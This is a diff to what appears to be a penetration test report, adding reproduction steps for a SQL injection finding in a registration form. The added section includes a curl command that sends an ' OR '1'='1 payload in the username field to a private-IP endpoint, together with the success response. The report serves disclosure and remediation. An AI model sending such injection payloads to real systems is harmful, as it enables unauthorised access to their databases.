@@ -170,6 +170,22 @@ curl -X POST http://10.0.0.10/register \
    - Deploy WAF rules to detect SQL injection patterns
    - Monitor for suspicious queries
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** SQL injection payload in registration form (username field)
+
+**Screenshot 2:** Successful registration response showing account created
+
+**Command Output:**
+
+```
+curl -X POST http://10.0.0.10/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test' OR '1'='1","password":"Password123!"}'
+
+Response: {"message":"Registration successful!","success":true}
+```
+
 ---
 
 ## Finding 2: SQL Injection - Vault Add Title Field
